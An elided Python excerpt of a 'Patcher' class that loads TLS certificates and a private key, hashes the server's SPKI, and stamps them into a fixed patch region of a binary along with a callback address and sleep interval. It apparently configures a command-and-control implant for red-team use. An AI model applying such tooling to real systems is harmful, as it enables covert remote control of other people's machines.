...
class Patcher:
    ...
    def _hash_spki(self) -> Optional[bytes]:
        ...
        try:
            with open(f"{self.certs_dir}/server.crt", "rb") as tmp:
                cert = x509.load_pem_x509_certificate(tmp.read())
    ...
    def _convert_to_der(self, cert_type: CertificateType) -> Optional[bytes]:
        """Converts specified PEM certificate or key into binary DER format"""

        try:
            if cert_type == CertificateType.PUBLIC:
                with open(f"{self.certs_dir}/client.crt", "rb") as tmp:
                    cert = x509.load_pem_x509_certificate(tmp.read())
                der = cert.public_bytes(Encoding.DER)
            else: 
                with open(f"{self.certs_dir}/client.key", "rb") as tmp:
                    key = load_pem_private_key(tmp.read(), password=None)
    ...
    def _build_patch(self, spki:
        bytes, public_key: bytes, private_key: bytes) -> Optional[bytes]: 
        ...
        if len(patch) > len(self.BINARY_PATCH):
            self.log.info(f"Patch ({len(patch)} bytes) exceeds maximum byte length of {len(self.BINARY_PATCH)}")
            return None 
    ...
    def _parse_stamper_args(self, args: list, str_usage: str) -> bool:
        ...
        parser.add_argument(
            "-c", "--callback", required=False, type=str, help="callback address or domain"
        )
        parser.add_argument(
            "--sleep",
            type=int,
    ...
    def patch_binary(self, args: list, str_usage: str) -> bool:
        ...
        public_key = self._convert_to_der(CertificateType.PUBLIC)
        private_key = self._convert_to_der(CertificateType.PRIVATE)
        if public_key is None or private_key is None:
            return False

        self.log.debug(f"Public key size: {len(public_key)} -- Private key size: {len(private_key)}")
